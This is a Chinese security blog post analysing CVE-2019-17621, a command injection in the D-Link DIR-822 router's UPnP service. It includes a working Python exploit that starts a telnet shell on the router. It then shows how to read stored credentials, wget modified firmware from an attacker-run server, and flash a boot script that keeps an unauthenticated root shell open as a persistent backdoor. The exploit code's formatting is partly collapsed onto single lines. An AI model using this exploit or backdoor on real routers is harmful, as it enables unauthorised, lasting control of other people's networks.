> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QLRxTfurYTPX3NNR3nZOMg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuv0LehibQHjS9mouzWrNcuTIv725ia8iacjUbxNDIYE0ettEM7I0nDbthlA/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvB8AHbC4gJF5YviaPX4Pfx0F7hia82YSsrN8SGBKPGEwjPYtm7tM4rfRA/640?wx_fmt=jpeg)

本篇文章将介绍如何仿真路由器，在证明漏洞存在后，如何更改固件、刷新固件并且长久驻留的一个解决方案。

**作者：维阵漏洞研究员 --km1ng**

**- 01 -**

**简述**

本次分析的漏洞为 cve-2019-17621，是一个远程代码执行漏洞（无需身份验证，一般处于局域网）。

因为网上多是对 Dlink-859 的分析并且 Dlink859 已有补丁，所以这里采用对 Dlink822 进行分析。网上的文章多是分析完毕证明有这个漏洞就结束，本篇文章还将介绍如何仿真路由器，在证明漏洞存在后，如何更改固件、刷新固件并且长久驻留的一个解决方案。

UPNP（Universal Plug and Play）即通用即插即用协议, 是为了实现电脑与智能的电器设备对等网络连接的体系结构。而内网地址与网络地址的转换就是基于此协议的，因此只要我们的路由器支持 upnp，那么我们就可以借此提高点对点传输速度。

**- 02 -**

**分析环境**

<table><tbody><tr><td width="269" valign="top"><strong>环境</strong></td><td width="269" valign="top"><strong>版本</strong></td></tr><tr><td width="269" valign="top">vmware</td><td width="269" valign="top">15.0.0</td></tr><tr><td width="269" valign="top">ubuntu</td><td width="269" valign="top">1604_x64</td></tr><tr><td width="269" valign="top">dlink-822</td><td width="269" valign="top">1.03B03(硬件版本 A1)</td></tr><tr><td width="269" valign="top">binwalk</td><td width="269" valign="top">2.2.1</td></tr><tr><td width="269" valign="top">IDA</td><td width="269" valign="top">7.5</td></tr></tbody></table>

**- 03 -**

**漏洞分析**

下载固件:

http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822

固件的 MD5 为`27fd2601cc6ae24a0db7b1066da08e1e`

使用 binwalk-e 命令解压固件。  

```
binwalk-e DIR822A1_FW103WWb03.bin
```

使用 file 指令查看`squashfs-root/bin/busybox`发现是 mips 架构的路由器, 进入`squashfs-root`目录将`htdocs/cgibin`文件拷贝出来, 放入 IDA 中分析。  

`genacgi_main`函数是漏洞开始触发点，通过`“REQUEST_URI”`获取 url 后对其进行验证，然后进入`sub_40FCE0`。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvN8EVjnKNJajJSyvRVvFLP6JjvNxH1Jia0rfwo18vBMkT8eqJOibnDiaCQ/640?wx_fmt=png)

下图为`sub_40FCE0`函数，其中 a1 为上图中传入的 url，通过`xmldbc_ephp`函数使用 socket 发送出去。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvSODrlleSw7z7VC8MeCbPVTffMVM04oZDiahibKEUZoFicpfaibiby7TuE9A/640?wx_fmt=png)

数据现在由 PHP 文件`run.NOTIFY.php`进行处理，其中请求方法会被再次验证。  

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvVvEzSjxH8fQBnaub4XUq0y8uicL2LdOWLA9oB1W9W9EDXGvHiaQxxjuw/640?wx_fmt=png)

该脚本会调用 PHP 函数`GENA_subscribe_new()`，并向其传递 cgibin 程序中`genacgi_main()`函数获得的变量，还包括变量`SHELL_FILE`。

文件：gena.php，函数`GENA_subscribe_new()。`

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvWJcf3AyniauHbXaGkQJBDibpGVoqLKicU43E4dmp7gN9JKz3NHnW8jYSA/640?wx_fmt=png)

`GENA_subscribe_new()`函数并不修改`$shell_file`变量。

gena.php，`GENA_notify_init()`函数：

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuv7xUFmsibK5ibnHOBLsibYm48Gn5Vv7iaJkPeg1B0Wk2cAGKiaViaTPf8qMTg/640?wx_fmt=png)

这就是变量`SHELL_FILE`结束的地方，它是通过调用 PHP 函数 fwrite() 创建的新文件的名称的一部分。

这个函数被使用了两次：第一次创建文件，它的名字来自我们控制的`SHELL_FILE`变量以及 getpid() 的输出。第二次调用 fwrite() 向这个文件添加了一行，其中还使用了 rm 系统命令，以删除它自己。为了进行攻击，我们只需要插入一个反引号包裹的系统命令，然后将其注入到 shell 脚本中。

**- 04 -**

**漏洞验证**

exp 如下，通过这个漏洞，我们可以利用 telnet 服务来进行访问。因为这个漏洞是 UPnP 协议漏洞，一般处于局域网才能使用。  

```
import socket
import os
from time import sleep
Exploit By Miguel Mendez & Pablo Pollanco
def httpSUB(server, port, shell_file):
print('\n[] Connection {host}:{port}'.format(host=server, port=port)) con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n" request += "Host: " + str(server) + str(port) + "\n" request += "Callback: http://192.168.0.4:34033/ServiceProxy27\n" request += "NT: upnp:event\n" request += "Timeout: Second-1800\n" request += "Accept-Encoding: gzip, deflate\n" request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n" sleep(1) print('[] Sending Payload')
con.connect((socket.gethostbyname(server),port))
con.send(str(request))
results = con.recv(4096)
sleep(1)
print('[] Running Telnetd Service') sleep(1) print('[] Opening Telnet Connection\n')
sleep(2)
os.system('telnet ' + str(server) + ' 9999')
serverInput = '192.168.0.1'
portInput = 49152
httpSUB(serverInput, portInput, 'telnetd -p 9999 &')
```

这里使用`firmware-analysis-plus`框架仿真路由器。

地址：

https://github.com/liyansong2018/firmware-analysis-plus

```
python3 fat.py -q git/firmware-analysis-plus/qemu-builds/2.5.0/ /home/admin-dir/bin/dlink/DIR822A1_FW103WWb03.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvmKkeHG1K5OicRzWicpHrSJwLGFlD5hUDMQAwJQ3HIibfCpAJCJ1ibkmEPg/640?wx_fmt=png)  

有可能使用浏览器访问 192.168.0.1 遇到不安全的 TLS 警告，直接启用即可。  

使用 nmap 扫描端口，可以发现 49152 端口是默认开启的。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvTrscFEreMgfYBicnNCoNRP397zjzKTZfiaJPUET11icxOHtvZiaTewv5EQ/640?wx_fmt=png)

使用 exp 测试仿真路由器，nmap 扫描可以发现 9999 端口已被打开，并且成功登录 telnet。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvy45eWZBBibLss0uxaxA6QNsu5S2zqPEPHQvOdaNxkK4JLiaI0rCrBw0A/640?wx_fmt=png)

**- 05 -**

 **固件更新**

更新固件使用仿真路由器有一些小缺陷，没有这款路由器的也可以继续使用仿真路由器做更新固件。更新固件的操作使用物理路由器。先介绍一种比较简单的办法，通过 telnet 登录 822 路由器，`cat/var/passwd`路由器里面存放这路由器的账号密码，通过 web 端更新固件。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvHMp08C2fQUDBPK5FFCBekTvEK6uFdwzQ0Pia7wXzvjI1UyyorteQ7Fw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvKzpsxWZH5QHcWoRGcIBE8fkHqqo8Y3LQkGFQVtpC5tj3kbqVPTy4TA/640?wx_fmt=png)

手动登录路由器 telnet，wget 固件然后升级，这里给出 822 路由器升级脚本为`squashfs-root/usr/sbin/fw_upgrade`。  

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuv4ufSUrYT7hbtC0HkmxwrKHhib1woDLNzNdQPW4bNibjl65iakraJB4hSA/640?wx_fmt=png)

下面再看一下`etc/events/FWUPDATER.sh`文件里面的操作。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvX7RjicMuRMQ0oe6RCOIPVNqBaomkde98ZGc0tcHXKNBMOzAaknEkzicA/640?wx_fmt=png)

并没有什么特别的操作，这里选择直接调用`usr/sbin/fw_upgrade`脚本文件，下面为笔者更新固件脚本，读者只需要少量更改即可使用。  

```
cd
cd /var
wget http://192.168.0.36:8000/DIR822A1_FW103WWb03.bin
mv DIR822A1_FW103WWb03.bin firmware.seama
chmod 777 firmware.seama
mount -t ramfs ramfs /proc
mkdir /proc/driver
cd
/usr/sbin/fw_upgrade /var/firmware.seama
```

固件更新脚本已有，也可以登录 telnet，现在可以制作新固件添加自己功能。

推荐使用`firmware-mod-kit`框架，git 地址：https://github.com/rampageX/firmware-mod-kit。

```
/firmware-mod-kit/extract-firmware.sh DIR822A1_FW103WWb03.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvmnzaPpnYrRliabv3mmpqopwnnELXdSNv8M2TEpI0XUQ23SDXxbc0uRw/640?wx_fmt=png)  

现在会在其目录下发现 fmk 目录，进入`fmk/rootfs`可以见到路由器的文件系统。进入`etc/init0.d/`会发现 rcS 文件，对固件的改动就在这里面。  

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvDGapaOsDuClkGcWLRzyrdJAqvOWFQnLDkKwwHdxQ1SkmK0CfO4esSQ/640?wx_fmt=png)

追加 rcS 文件`/etc/init0.d/fir.sh`，fir.sh 为自己创建的脚本。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvAFXMwBNibX1SBaZP68kZ3Gz7onj5thjibRnOpn19pE8drEuawff8jHfQ/640?wx_fmt=png)

下面为 fir.sh 脚本内容：

```
#!/bin/sh
min=1
while :
do
    telnetd -l /bin/sh -p 8888
    sleep 1h
    echo $min
done
```

返回 fmk 的同级目录，使用`firmware-mod-kit/build-firmware.sh`即可完成固件打包。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvSILJFJ4iba4iaZVS4lnhc2K1VySGe81iaVEmKqsHv1UGXkuzpRP1vJ0AQ/640?wx_fmt=png)

`python-m SimpleHTTPServer 8080`搭建起一个简单的 web 服务。将改好的 dlink.sh 和固件放入 web 服务目录下。

使用漏洞利用登录到 telnet，进入 tmp 目录使用 wget 请求 dlink.sh。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvm8aZ41E2wFR3nQ6nfmIPh56Thiak4VPrCCb4ibs2C3SRnEN7KmUI5sOw/640?wx_fmt=png)

运行 dlink.sh，固件刷新需要稍等几分钟。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvZib1dd1pfEdH1afYZw8C8GQibaYLb9jSJIrga21tWeicCiceyC5QPIGVcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvE9FHDUSx7X5jIfrhZcz95Giah2ZqrG6CDV9x5ibUYNogN34mQKx2C7pw/640?wx_fmt=png)

看上去是更新成功了，使用 nmap 扫描一下，固件里面的时间和版本号根据需求搜索更改即可。

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuveq7Z1ib9rXJwO9RTQwems8g0bQAta98CpGHs01N8c1soFonnibxIl1zg/640?wx_fmt=png)

尝试使用这个端口号登录 telnet，使用 ps 命令查看进程，发现固件已被更新。  

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvibMbyuQWOrupa8PCnrcmMMu98VM5wjJLiaChTZ96zglKKAw0RIT0troA/640?wx_fmt=png)

**- 06 -**

**总结**

以上便是本次漏洞分析利用的全部内容，这个漏洞相对来说比较简单，在已爆出 cve 的情况下分析利用漏洞所占时间并不是很多，更多的时间是花在例如：寻找验证固件更新脚本上。在成功利用漏洞的基础上，添加了后门提高了对路由器的长久稳定控制。

cve 官网并未爆出，822A1 版本的路由器受到影响，可以先使用 IDA 分析，确认有漏洞之后在使用仿真模拟确认路由器是否真的存在这个漏洞。这种方式快捷简单、无需时间等待和经济压力。

**维阵服务**

维阵 1.1.0 强势上线，更新后支持多类型文件格式检测，包括 ELF、Linux 软件包、IoT 固件包、APK 安装包；新增补丁对比模块免费开放。

目前官网预约演示通道持续开放中，欢迎各大企业、软件厂商对软件产品进行安全性评估咨询。

**知彼先知己，让维阵为您服务。**

**商务邮箱: business@secwx.com**

**往期精选**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvqmk5HBbDkqcgWEgsby2asaP7FynLhc0iavttrjKH21uCzD5INxDdncA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzkyNTEwMTUzMA==&mid=2247489280&idx=1&sn=b7bcb9ab2f3e19f9e4c91cd2cda04741&chksm=c1caebb5f6bd62a3a82773805d266d15616534a28a55cbf70d256c95dac884d50d5d0676a9b5&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvlGMhib8yE3VPBvA868cED5mAziazX5IZPVUIBotjBz7lAwG64tvklBRg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzkyNTEwMTUzMA==&mid=2247489279&idx=1&sn=7484453f3c5a23c1f0d2f399ff65ec9a&chksm=c1caea4af6bd635cfd06de913a1d8f58cc75d4837397fb4b001ea24e81dc459efd7610642adf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvCqbhE6Cy2N3XbgmaEyO33s5xzw3lAzIlbsEpw8RzPuI8mE9M4AoPBg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzkyNTEwMTUzMA==&mid=2247489281&idx=1&sn=5259ab5f3e6729182b67d60bba42a9e4&chksm=c1caebb4f6bd62a282467382ce365678b9b8bb620ebdd45ae5e7df3ddc5baf7df1427637cd9b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuv3wveRj591ABDz2Pj9fzdlB4BrcLcEFqVlsPpDctUfDcog8tsyiarksg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzkyNTEwMTUzMA==&mid=2247489667&idx=1&sn=ce20f16846a88ddc85d900db27786534&chksm=c1cae436f6bd6d200a9fbf9fdb4f5fd9c96f9ae76e90cdcfae7473626a6f19595b72b9d1e764&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOtIG0ZWCWkgic6t1bJ8ooVuvPlJy7ibEyQKYwq3RxdAfUjhwZB7LE3UvfDZQnSoqibyia9icPBeQ1JqqzA/640?wx_fmt=jpeg)